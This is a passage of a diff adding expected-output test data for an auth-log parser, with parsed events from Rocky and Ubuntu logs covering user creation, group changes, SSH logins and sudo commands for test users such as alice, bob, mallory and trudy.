+   "message": "add 'mallory' to group 'wheel'",
+   "fields": {
+    "action": "add",
+    "group": "wheel"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2025-11-02T11:34:34Z",
+   "last_at": "2025-11-02T11:34:34Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "trudy",
+   "message": "new user: name=trudy, UID=1002, GID=1002, home=/home/trudy, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1002
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2025-11-02T11:34:34Z",
+   "last_at": "2025-11-02T11:34:34Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "trudy",
+   "message": "add 'trudy' to group 'wheel'",
+   "fields": {
+    "action": "add",
+    "group": "wheel"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2025-11-02T11:34:34Z",
+   "last_at": "2025-11-02T11:34:34Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "mallory",
+   "message": "delete 'mallory' from group 'wheel'",
+   "fields": {
+    "action": "remove",
+    "group": "wheel"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2025-11-02T11:34:35Z",
+   "last_at": "2025-11-02T11:34:35Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "alice",
+   "message": "add 'alice' to group 'wheel'",
+   "fields": {
+    "action": "add",
+    "group": "wheel"
+   }
+  }
+ ],
+ "testdata/auth/rocky-9.secure": [
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:02:43Z",
+   "last_at": "2026-10-31T19:02:43Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "alice",
+   "message": "new user: name=alice, UID=1000, GID=1000, home=/home/alice, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1000
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:02:43Z",
+   "last_at": "2026-10-31T19:02:43Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "bob",
+   "message": "new user: name=bob, UID=1001, GID=1001, home=/home/bob, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1001
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:02:43Z",
+   "last_at": "2026-10-31T19:02:43Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "alice",
+   "message": "add 'alice' to group 'wheel'",
+   "fields": {
+    "action": "add",
+    "group": "wheel"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_failed",
+   "first_at": "2026-10-31T19:02:45Z",
+   "last_at": "2026-10-31T19:02:45Z",
+   "count": 1,
+   "program": "sshd-session",
+   "src_ip": "127.0.0.1",
+   "username": "admin",
+   "message": "Failed password for invalid user admin from 127.0.0.1 port 50110 ssh2",
+   "fields": {
+    "invalid_user": true,
+    "method": "password",
+    "port": 50110
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_failed",
+   "first_at": "2026-10-31T19:02:50Z",
+   "last_at": "2026-10-31T19:02:50Z",
+   "count": 1,
+   "program": "sshd-session",
+   "src_ip": "127.0.0.1",
+   "username": "root",
+   "message": "Failed password for root from 127.0.0.1 port 50118 ssh2",
+   "fields": {
+    "invalid_user": false,
+    "method": "password",
+    "port": 50118
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_succeeded",
+   "first_at": "2026-10-31T19:02:50Z",
+   "last_at": "2026-10-31T19:02:50Z",
+   "count": 1,
+   "program": "sshd-session",
+   "src_ip": "127.0.0.1",
+   "username": "alice",
+   "message": "Accepted password for alice from 127.0.0.1 port 50130 ssh2",
+   "fields": {
+    "method": "password",
+    "port": 50130,
+    "session": "287"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_opened",
+   "first_at": "2026-10-31T19:02:50Z",
+   "last_at": "2026-10-31T19:02:50Z",
+   "count": 1,
+   "program": "sshd-session",
+   "username": "alice",
+   "message": "pam_unix(sshd:session): session opened for user alice(uid=1000) by alice(uid=0)",
+   "fields": {
+    "session": "287"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_closed",
+   "first_at": "2026-10-31T19:02:50Z",
+   "last_at": "2026-10-31T19:02:50Z",
+   "count": 1,
+   "program": "sshd-session",
+   "username": "alice",
+   "message": "pam_unix(sshd:session): session closed for user alice",
+   "fields": {
+    "session": "287"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:02:50Z",
+   "last_at": "2026-10-31T19:02:50Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-10-31T19:02:50Z",
+   "last_at": "2026-10-31T19:02:50Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/bin/ls [1 arg]",
+   "fields": {
+    "command": "/bin/ls [1 arg]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:02:50Z",
+   "last_at": "2026-10-31T19:02:50Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_failed",
+   "first_at": "2026-10-31T19:02:53Z",
+   "last_at": "2026-10-31T19:02:53Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : 1 incorrect password attempt ; PWD=[redacted] ; USER=root ; COMMAND=/bin/ls [1 arg]",
+   "fields": {
+    "command": "/bin/ls [1 arg]",
+    "reason": "incorrect_password",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:02:53Z",
+   "last_at": "2026-10-31T19:02:53Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user bob(uid=1001) by (uid=0)",
+   "fields": {
+    "target_user": "bob"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_failed",
+   "first_at": "2026-10-31T19:02:53Z",
+   "last_at": "2026-10-31T19:02:53Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "bob",
+   "message": "     bob : user NOT in sudoers ; PWD=[redacted] ; USER=root ; COMMAND=/bin/ls [1 arg]",
+   "fields": {
+    "command": "/bin/ls [1 arg]",
+    "reason": "not_in_sudoers",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:02:53Z",
+   "last_at": "2026-10-31T19:02:53Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:02:53Z",
+   "last_at": "2026-10-31T19:02:53Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:02:54Z",
+   "last_at": "2026-10-31T19:02:54Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "deploy",
+   "message": "new user: name=deploy, UID=1002, GID=1002, home=/home/deploy, shell=/bin/bash, from=none",
+   "fields": {
+    "uid": 1002
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:02:54Z",
+   "last_at": "2026-10-31T19:02:54Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "deploy",
+   "message": "add 'deploy' to group 'wheel'",
+   "fields": {
+    "action": "add",
+    "group": "wheel"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:02:54Z",
+   "last_at": "2026-10-31T19:02:54Z",
+   "count": 1,
+   "program": "gpasswd",
+   "username": "deploy",
+   "message": "user deploy added by root to group adm",
+   "fields": {
+    "action": "add",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:02:54Z",
+   "last_at": "2026-10-31T19:02:54Z",
+   "count": 1,
+   "program": "gpasswd",
+   "username": "deploy",
+   "message": "user deploy removed by root from group adm",
+   "fields": {
+    "action": "remove",
+    "group": "adm"
+   }
+  }
+ ],
+ "testdata/auth/rocky-9.sudo.secure": [
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2025-11-02T11:34:35Z",
+   "last_at": "2025-11-02T11:34:35Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/bin/ls [1 arg]",
+   "fields": {
+    "command": "/bin/ls [1 arg]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2025-11-02T11:34:35Z",
+   "last_at": "2025-11-02T11:34:35Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=bob ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2025-11-02T11:34:35Z",
+   "last_at": "2025-11-02T11:34:35Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2025-11-02T11:34:35Z",
+   "last_at": "2025-11-02T11:34:35Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2025-11-02T11:34:35Z",
+   "last_at": "2025-11-02T11:34:35Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=bob ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2025-11-02T11:34:35Z",
+   "last_at": "2025-11-02T11:34:35Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; ENV=[redacted] ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2025-11-02T11:34:35Z",
+   "last_at": "2025-11-02T11:34:35Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; GROUP=adm ; COMMAND=/bin/sh [2 args]",
+   "fields": {
+    "command": "/bin/sh [2 args]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2025-11-02T11:34:35Z",
+   "last_at": "2025-11-02T11:34:35Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; TSID=000001 ; COMMAND=/usr/bin/id [0 args]",
+   "fields": {
+    "command": "/usr/bin/id [0 args]",
+    "target_user": "root",
+    "tsid": "000001"
+   }
+  }
+ ],
+ "testdata/auth/ubuntu-22.04.sessions.log": [
+  {
+   "source": "auth",
+   "kind": "ssh_login_succeeded",
+   "first_at": "2025-11-09T13:15:12Z",
+   "last_at": "2025-11-09T13:15:12Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "root",
+   "message": "Accepted publickey for root from 127.0.0.1 port 50214 ssh2: ED25519 SHA256:X2TwaG1Cg+TPwf3x3jIl0PCVRFKDWdWdzoc4nG4dmBc",
+   "fields": {
+    "method": "publickey",
+    "port": 50214,
+    "session": "3742"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_opened",
+   "first_at": "2025-11-09T13:15:12Z",
+   "last_at": "2025-11-09T13:15:12Z",
+   "count": 1,
+   "program": "sshd",
+   "username": "root",
+   "message": "pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)",
+   "fields": {
+    "session": "3742"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2025-11-09T13:15:12Z",
+   "last_at": "2025-11-09T13:15:12Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "root",
+   "message": "    root : TTY=pts/0 ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/id [0 args]",
+   "fields": {
+    "command": "/usr/bin/id [0 args]",
+    "target_user": "root",
+    "tty": "pts/0"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_closed",
+   "first_at": "2025-11-09T13:15:12Z",
+   "last_at": "2025-11-09T13:15:12Z",
+   "count": 1,
+   "program": "sshd",
+   "username": "root",
+   "message": "pam_unix(sshd:session): session closed for user root",
+   "fields": {
+    "session": "3742"
+   }
+  }
+ ],
+ "testdata/auth/ubuntu-24.04.auth.log": [
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T18:59:40.397874Z",
+   "last_at": "2026-10-31T18:59:40.397874Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "alice",
+   "message": "new user: name=alice, UID=1001, GID=1001, home=/home/alice, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1001
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T18:59:40.477143Z",
+   "last_at": "2026-10-31T18:59:40.477143Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "alice",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for alice"
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T18:59:40.496763Z",
+   "last_at": "2026-10-31T18:59:40.496763Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "bob",
+   "message": "new user: name=bob, UID=1002, GID=1002, home=/home/bob, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1002
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T18:59:40.58413Z",
+   "last_at": "2026-10-31T18:59:40.58413Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "bob",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for bob"
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T18:59:40.606222Z",
+   "last_at": "2026-10-31T18:59:40.606222Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "root",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for root"
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T18:59:40.653609Z",
+   "last_at": "2026-10-31T18:59:40.653609Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "alice",
+   "message": "add 'alice' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_failed",
+   "first_at": "2026-10-31T18:59:42.424014Z",
+   "last_at": "2026-10-31T18:59:42.424014Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "admin",
+   "message": "Failed password for invalid user admin from 127.0.0.1 port 46894 ssh2",
+   "fields": {
+    "invalid_user": true,
+    "method": "password",
+    "port": 46894
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_failed",
+   "first_at": "2026-10-31T18:59:45.851083Z",
+   "last_at": "2026-10-31T18:59:45.851083Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "root",
+   "message": "Failed password for root from 127.0.0.1 port 34844 ssh2",
+   "fields": {
+    "invalid_user": false,
+    "method": "password",
+    "port": 34844
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_succeeded",
+   "first_at": "2026-10-31T18:59:47.644263Z",
+   "last_at": "2026-10-31T18:59:47.644263Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "alice",
+   "message": "Accepted password for alice from 127.0.0.1 port 34854 ssh2",
+   "fields": {
+    "method": "password",
+    "port": 34854,
+    "session": "3942"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_opened",
+   "first_at": "2026-10-31T18:59:47.644999Z",
+   "last_at": "2026-10-31T18:59:47.644999Z",
+   "count": 1,
+   "program": "sshd",
+   "username": "alice",
+   "message": "pam_unix(sshd:session): session opened for user alice(uid=1001) by alice(uid=0)",
+   "fields": {
+    "session": "3942"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_closed",
+   "first_at": "2026-10-31T18:59:47.698581Z",
+   "last_at": "2026-10-31T18:59:47.698581Z",
+   "count": 1,
+   "program": "sshd",
+   "username": "alice",
+   "message": "pam_unix(sshd:session): session closed for user alice",
+   "fields": {
+    "session": "3942"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T18:59:47.700957Z",
+   "last_at": "2026-10-31T18:59:47.700957Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1001) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-10-31T18:59:47.727538Z",
+   "last_at": "2026-10-31T18:59:47.727538Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/ls [1 arg]",
+   "fields": {
+    "command": "/usr/bin/ls [1 arg]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T18:59:47.731227Z",
+   "last_at": "2026-10-31T18:59:47.731227Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1001) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_failed",
+   "first_at": "2026-10-31T18:59:49.668288Z",
+   "last_at": "2026-10-31T18:59:49.668288Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : 1 incorrect password attempt ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/ls [1 arg]",
+   "fields": {
+    "command": "/usr/bin/ls [1 arg]",
+    "reason": "incorrect_password",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T18:59:49.678397Z",
+   "last_at": "2026-10-31T18:59:49.678397Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user bob(uid=1002) by (uid=0)",
+   "fields": {
+    "target_user": "bob"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_failed",
+   "first_at": "2026-10-31T18:59:49.720124Z",
+   "last_at": "2026-10-31T18:59:49.720124Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "bob",
+   "message": "     bob : user NOT in sudoers ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/ls [1 arg]",
+   "fields": {
+    "command": "/usr/bin/ls [1 arg]",
+    "reason": "not_in_sudoers",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T18:59:49.722429Z",
+   "last_at": "2026-10-31T18:59:49.722429Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1001) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T18:59:49.726026Z",
+   "last_at": "2026-10-31T18:59:49.726026Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user root(uid=0) by (uid=0)",
+   "fields": {
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T18:59:51.760418Z",
+   "last_at": "2026-10-31T18:59:51.760418Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "deploy",
+   "message": "new user: name=deploy, UID=1003, GID=1003, home=/home/deploy, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1003
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T18:59:51.850618Z",
+   "last_at": "2026-10-31T18:59:51.850618Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "deploy",
+   "message": "add 'deploy' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T18:59:51.900823Z",
+   "last_at": "2026-10-31T18:59:51.900823Z",
+   "count": 1,
+   "program": "gpasswd",
+   "username": "deploy",
+   "message": "user deploy added by root to group adm",
+   "fields": {
+    "action": "add",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T18:59:51.934476Z",
+   "last_at": "2026-10-31T18:59:51.934476Z",
+   "count": 1,
+   "program": "gpasswd",
+   "username": "deploy",
+   "message": "user deploy removed by root from group adm",
+   "fields": {
+    "action": "remove",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T18:59:51.968338Z",
+   "last_at": "2026-10-31T18:59:51.968338Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "deploy",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for deploy"
+  }
+ ],
+ "testdata/auth/ubuntu-24.04.groups.log": [
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-02T11:34:13.054289Z",
+   "last_at": "2026-11-02T11:34:13.054289Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "alice",
+   "message": "new user: name=alice, UID=1001, GID=1001, home=/home/alice, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1001
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-02T11:34:13.12742Z",
+   "last_at": "2026-11-02T11:34:13.12742Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "mallory",
+   "message": "new user: name=mallory, UID=1002, GID=1002, home=/home/mallory, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1002
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-11-02T11:34:13.127623Z",
+   "last_at": "2026-11-02T11:34:13.127623Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "mallory",
+   "message": "add 'mallory' to group 'adm'",
+   "fields": {
+    "action": "add",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-11-02T11:34:13.127651Z",
+   "last_at": "2026-11-02T11:34:13.127651Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "mallory",
+   "message": "add 'mallory' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-02T11:34:13.202364Z",
+   "last_at": "2026-11-02T11:34:13.202364Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "trudy",
+   "message": "new user: name=trudy, UID=1003, GID=1003, home=/home/trudy, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1003
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-11-02T11:34:13.202557Z",
+   "last_at": "2026-11-02T11:34:13.202557Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "trudy",
+   "message": "add 'trudy' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-11-02T11:34:13.26429Z",
+   "last_at": "2026-11-02T11:34:13.26429Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "mallory",
+   "message": "delete 'mallory' from group 'sudo'",
+   "fields": {
+    "action": "remove",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-11-02T11:34:13.332196Z",
+   "last_at": "2026-11-02T11:34:13.332196Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "alice",
+   "message": "add 'alice' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  }
+ ],
+ "testdata/auth/ubuntu-24.04.sudo.log": [
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:34:13.362813Z",
+   "last_at": "2026-11-02T11:34:13.362813Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/bin/ls [1 arg]",
+   "fields": {
+    "command": "/bin/ls [1 arg]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:34:13.383239Z",
+   "last_at": "2026-11-02T11:34:13.383239Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=bob ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:34:13.403511Z",
+   "last_at": "2026-11-02T11:34:13.403511Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:34:13.425098Z",
+   "last_at": "2026-11-02T11:34:13.425098Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:34:13.44715Z",
+   "last_at": "2026-11-02T11:34:13.44715Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=bob ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:34:13.46888Z",
+   "last_at": "2026-11-02T11:34:13.46888Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; ENV=[redacted] ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:34:13.490092Z",
+   "last_at": "2026-11-02T11:34:13.490092Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; GROUP=adm ; COMMAND=/bin/sh [2 args]",
+   "fields": {
+    "command": "/bin/sh [2 args]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:34:13.512805Z",
+   "last_at": "2026-11-02T11:34:13.512805Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; TSID=000001 ; COMMAND=/usr/bin/id [0 args]",
+   "fields": {
+    "command": "/usr/bin/id [0 args]",
+    "target_user": "root",
+    "tsid": "000001"
+   }
+  }
+ ],
+ "testdata/auth/ubuntu-26.04.sudo.log": [
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-12T10:40:49.464147Z",
+   "last_at": "2026-11-12T10:40:49.464147Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "alice :  PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/ls [1 arg]",
+   "fields": {
+    "command": "/usr/bin/ls [1 arg]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-12T10:40:49.477143Z",
+   "last_at": "2026-11-12T10:40:49.477143Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "alice :  PWD=[redacted] ; USER=bob ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-12T10:40:49.493745Z",
+   "last_at": "2026-11-12T10:40:49.493745Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "alice :  PWD=[redacted] ; USER=root ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-12T10:40:49.512188Z",
+   "last_at": "2026-11-12T10:40:49.512188Z",
+   "count": 1,
+   "program": "sudo",
